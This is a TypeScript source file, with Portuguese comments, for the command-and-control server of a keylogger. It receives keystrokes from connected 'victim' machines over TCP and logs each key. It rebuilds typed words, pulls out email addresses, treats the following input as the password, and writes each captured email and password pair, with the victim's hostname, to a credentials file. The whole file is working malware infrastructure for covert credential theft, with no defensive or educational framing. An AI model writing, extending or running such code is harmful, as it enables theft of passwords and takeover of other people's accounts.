import { createServer } from "node:net";
import { writeFile, readFile, mkdir } from "node:fs/promises";
import { DEFAULT_HOST, DEFAULT_PORT } from "./protocol.js";
import type { C2Message, VictimInfo } from "./protocol.js";
import type { KeyEvent } from "./types.js";

const R   = "\x1b[0m";
const DIM = "\x1b[2m";
const G   = "\x1b[32m";
const Y   = "\x1b[33m";
const RED = "\x1b[31m";
const M   = "\x1b[35m";
const C   = "\x1b[36m";
const B   = "\x1b[1m";

const out = (s: string) => process.stdout.write(s);

const CATEGORY_COLOR: Record<string, string> = {
  char:    G,
  control: Y,
  special: M,
  unknown: DIM,
};

// extrai o primeiro email válido de uma string (pode ter lixo depois)
const EMAIL_EXTRACT = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;

const CREDENTIALS_FILE = "logs/credentials.json";

interface Credential {
  email: string;
  password: string;
  timestamp: string;
  hostname: string;
}

async function saveCredential(cred: Credential) {
  let list: Credential[] = [];
  await mkdir("logs", { recursive: true });
  try {
    list = JSON.parse(await readFile(CREDENTIALS_FILE, "utf8")) as Credential[];
  } catch { /* arquivo ainda não existe */ }
  list.push(cred);
  await writeFile(CREDENTIALS_FILE, JSON.stringify(list, null, 2), "utf8");
  out(`  ${DIM}>> salvo em ${CREDENTIALS_FILE} (${list.length} registro(s))${R}\n`);
}

out(`${DIM}listening on ${DEFAULT_HOST}:${DEFAULT_PORT}${R}\n\n`);

const server = createServer((socket) => {
  let victim: VictimInfo | null = null;
  let buf = "";
  let word = "";
  let pendingEmail: string | null = null;

  function flushWord(w: string) {
    if (!w) return;

    const match = EMAIL_EXTRACT.exec(w);
    if (match) {
      const email = match[0];
      const suffix = w.slice(match.index + email.length);

      out(`\n  ${C}${B}email  ${email}${R}\n`);

      if (suffix) {
        // senha colada logo após o email sem separador
        out(`  ${RED}${B}pass   ${suffix}${R}\n\n`);
        void saveCredential({ email, password: suffix, timestamp: new Date().toISOString(), hostname: victim?.hostname ?? "" });
        pendingEmail = null;
      } else {
        pendingEmail = email;
      }
      return;
    }

    if (pendingEmail) {
      out(`  ${RED}${B}pass   ${w}${R}\n\n`);
      void saveCredential({ email: pendingEmail, password: w, timestamp: new Date().toISOString(), hostname: victim?.hostname ?? "" });
      pendingEmail = null;
      return;
    }

    out(`  ${DIM}word   ${R}${w}\n`);
  }

  socket.on("data", (chunk: Buffer) => {
    buf += chunk.toString("utf8");
    const lines = buf.split("\n");
    buf = lines.pop() ?? "";

    for (const line of lines) {
      if (!line.trim()) continue;
      let msg: C2Message;
      try { msg = JSON.parse(line) as C2Message; } catch { continue; }

      if (msg.type === "handshake") {
        victim = msg.victim;
        word = "";
        pendingEmail = null;
        out(`${G}+ ${msg.victim.hostname}${R}  ${DIM}${msg.victim.platform}  ${msg.victim.sessionId.slice(0, 8)}${R}\n\n`);
        out(`${DIM}  time          type     hex                  key${R}\n`);

      } else if (msg.type === "key") {
        const ev: KeyEvent = msg.event;
        const col = CATEGORY_COLOR[ev.category] ?? R;
        const ts = ev.timestamp.slice(11, 23);
        const label = ev.category === "char" ? ev.key : `[${ev.key}]`;
        out(`  ${DIM}${ts}${R}  ${col}${ev.category.padEnd(7)}${R}  ${DIM}${ev.raw.padEnd(20)}${R}  ${col}${label}${R}\n`);

        if (ev.key === "Backspace") {
          word = word.slice(0, -1);
        } else if ((ev.category === "char" && ev.key.trim() === "") || ev.key === "Enter" || ev.key === "Tab") {
          flushWord(word);
          word = "";
        } else if (ev.category === "char") {
          word += ev.key;
        }

      } else if (msg.type === "disconnect") {
        flushWord(word);
        word = "";
        out(`\n${DIM}- desconectado${R}\n\n`);
      }
    }
  });

  socket.on("close", () => {
    flushWord(word);
    word = "";
    if (victim) out(`\n${RED}- ${victim.hostname} perdeu conexão${R}\n\n`);
    victim = null;
  });

  socket.on("error", () => { victim = null; });
});

server.listen(DEFAULT_PORT, DEFAULT_HOST);

server.on("error", (err) => {
  process.stderr.write(`erro: ${err.message}\n`);
  process.exit(1);
});

process.on("SIGINT", () => {
  out("\n");
  server.close();
  process.exit(0);
});
